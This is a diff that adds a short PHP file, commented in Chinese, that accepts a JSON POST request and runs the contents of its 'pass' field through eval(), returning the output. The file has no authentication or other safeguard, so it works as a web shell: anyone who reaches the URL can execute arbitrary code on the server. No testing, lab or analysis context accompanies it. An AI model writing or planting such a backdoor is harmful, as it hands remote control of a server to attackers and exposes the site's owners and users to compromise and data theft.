@@ -1,0 +1,20 @@
+<?php
+// 设置 Content-Type 为 application/json
+header('Content-Type: application/json');
+
+// 获取 POST 数据
+$input = file_get_contents("php://input");
+$data = json_decode($input, true);
+
+// 确保 JSON 数据正确
+if (isset($data['pass'])) {
+    // 执行传入的 PHP 代码
+    $output = eval($data['pass']);  // 执行传入的 PHP 代码
+
+    // 返回执行结果，JSON 格式
+    echo json_encode(['status' => 'success', 'output' => $output]);
+} else {
+    // 如果没有传入正确的参数，返回错误信息
+    echo json_encode(['status' => 'error', 'message' => 'Missing "pass" parameter']);
+}
+?>
